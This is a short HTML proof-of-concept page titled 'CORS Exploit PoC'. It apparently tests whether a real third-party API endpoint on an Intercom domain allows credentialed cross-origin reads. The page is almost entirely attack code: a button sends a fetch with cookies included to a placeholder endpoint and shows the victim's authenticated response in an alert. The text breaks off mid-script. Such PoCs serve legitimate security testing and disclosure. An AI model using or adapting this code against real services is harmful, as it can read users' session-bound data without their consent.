<!DOCTYPE html>
<html>
<head>
  <title>CORS Exploit PoC</title>
</head>
<body>
  <h1>CORS Exploit Test</h1>
  <button onclick="corsExploit()">Exploit</button>

  <script>
    function corsExploit() {
      fetch('https://api-iam.intercom.io/your-endpoint', {
        method: 'GET',
        credentials: 'include' // Ensures cookies/session are sent with the request
      })
      .then(response => response.text())
      .then(data => {
        alert("Data received: " + data); // Display the data from the API
      })
      .catch(err => {
        alert("Request failed: " + err); // Show error message if request fails
      });
